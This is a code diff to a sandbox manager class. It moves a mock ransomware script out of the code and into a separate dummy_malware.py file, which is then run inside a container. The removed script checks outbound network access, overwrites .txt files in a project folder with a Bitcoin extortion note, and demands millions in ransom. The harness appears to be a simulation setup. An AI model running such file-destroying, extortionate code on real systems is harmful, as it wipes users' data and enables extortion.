@@ -40,40 +40,15 @@ class SandboxManager:
         except:
             return "Sandbox not running"
         
-        malware_script = """
-import os
-import urllib.request
-
-note = '''========================================
-!!! WARNING: YOU HAVE BEEN HACKED !!!
-========================================
-All sensitive data, including passwords and crypto wallets, has been stolen and encrypted.
-
-To prevent the public release of your private keys and financial data, you must send $4,000,000 USD in Bitcoin to the following address:
-bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
-
-If payment is not received within 48 hours, your data will be published on the dark web.'''
-
-try:
-    urllib.request.urlopen('http://google.com', timeout=2)
-    with open('/sandbox/network_activity.log', 'w') as f:
-        f.write('Malware established outbound network connection to external IP.')
-except:
-    pass
-
-for root, dirs, files in os.walk('/sandbox/bank-project/'):
-    for file in files:
-        if file.endswith('.txt'):
-            filepath = os.path.join(root, file)
-            try:
-                with open(filepath, 'w') as f:
-                    f.write(note)
-            except:
-                pass
-"""
         try:
+            # Read the malware script from our separated file
+            with open('dummy_malware.py', 'r') as file:
+                malware_script = file.read()
+                
             self.container.exec_run(['python3', '-c', malware_script])
             return "Malware executed successfully"
+        except FileNotFoundError:
+            return "Error: dummy_malware.py file was not found!"
         except Exception as e:
             return str(e)
 
